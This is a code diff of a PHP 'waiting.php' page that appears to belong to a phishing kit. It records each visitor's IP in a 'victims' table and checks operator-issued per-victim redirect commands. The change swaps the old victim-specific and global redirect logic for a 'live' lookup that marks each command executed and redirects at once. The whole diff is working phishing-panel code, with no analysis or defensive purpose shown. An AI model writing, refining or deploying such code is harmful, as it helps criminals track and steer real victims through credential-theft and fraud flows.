@@ -8,67 +8,51 @@ require_once 'blocker-raw.php';
 header("X-Frame-Options: DENY");
 header("X-Content-Type-Options: nosniff");
 
-// Check for redirect commands
-try {
-    $database = new Database();
-    $db = $database->getConnection();
-
-    // Check for specific victim redirect first
-    $victim_ip = $_SERVER['REMOTE_ADDR'];
-    $victim_query = "SELECT rc.target 
-                    FROM redirect_commands rc 
-                    JOIN victims v ON rc.victim_id = v.id 
-                    WHERE rc.command = 'redirect' 
-                    AND v.ip_address = :ip 
-                    AND rc.created_at > NOW() - INTERVAL '5 minutes'
-                    ORDER BY rc.created_at DESC 
-                    LIMIT 1";
-    $victim_stmt = $db->prepare($victim_query);
-    $victim_stmt->execute([':ip' => $victim_ip]);
-    $victim_redirect = $victim_stmt->fetch(PDO::FETCH_ASSOC);
-
-    if ($victim_redirect) {
-        $redirect_target = trim($victim_redirect['target']);
-        $current_page = basename($_SERVER['PHP_SELF']);
-        
-        if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
-            header("Location: $redirect_target");
-            exit;
-        }
-    }
-
-    // Check global redirect
-    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
-    $stmt = $db->query($query);
-    $redirect_target = $stmt->fetch(PDO::FETCH_ASSOC);
-
-    if ($redirect_target) {
-        $redirect_target = trim($redirect_target['target']);
-        $current_page = basename($_SERVER['PHP_SELF']);
-        
-        if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
-            header("Location: $redirect_target");
-            exit;
-        }
-    }
-} catch (Exception $e) {
-    error_log("Database error in waiting.php: " . $e->getMessage());
-}
+$victim_ip = $_SERVER['REMOTE_ADDR'];
 
 // Update victim tracking
 try {
     $database = new Database();
     $db = $database->getConnection();
-    $ip = $_SERVER['REMOTE_ADDR'];
     
-    $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'waiting.php' WHERE ip_address = :ip AND status = 'active'";
+    $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'waiting.php' WHERE ip_address = :ip";
     $update_stmt = $db->prepare($update_query);
-    $update_stmt->execute([':ip' => $ip]);
+    $update_stmt->execute([':ip' => $victim_ip]);
 } catch (Exception $e) {
-    error_log("Victim update error in waiting: " . $e->getMessage());
+    error_log("Victim update error: " . $e->getMessage());
+}
+
+// Check for LIVE redirect commands (only unexpired, unexecuted for this IP)
+try {
+    $redirect_query = "SELECT target FROM redirect_commands 
+                      WHERE victim_ip = :ip
+                      AND command = 'redirect' 
+                      AND executed = FALSE 
+                      AND expires_at > NOW()
+                      ORDER BY created_at DESC 
+                      LIMIT 1";
+    $redirect_stmt = $db->prepare($redirect_query);
+    $redirect_stmt->execute([':ip' => $victim_ip]);
+    $redirect = $redirect_stmt->fetch(PDO::FETCH_ASSOC);
+
+    if ($redirect) {
+        $redirect_target = trim($redirect['target']);
+        
+        // Mark as executed
+        $mark_executed = "UPDATE redirect_commands SET executed = TRUE WHERE target = :target AND victim_ip = :ip";
+        $mark_stmt = $db->prepare($mark_executed);
+        $mark_stmt->execute([':target' => $redirect_target, ':ip' => $victim_ip]);
+        
+        // INSTANT REDIRECT
+        header("Location: $redirect_target");
+        exit;
+    }
+} catch (Exception $e) {
+    error_log("Redirect check error: " . $e->getMessage());
 }
 // ==================== PROTECTION END ====================
 ?>
+
 <html lang=en>
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width, initial-scale=1.0">
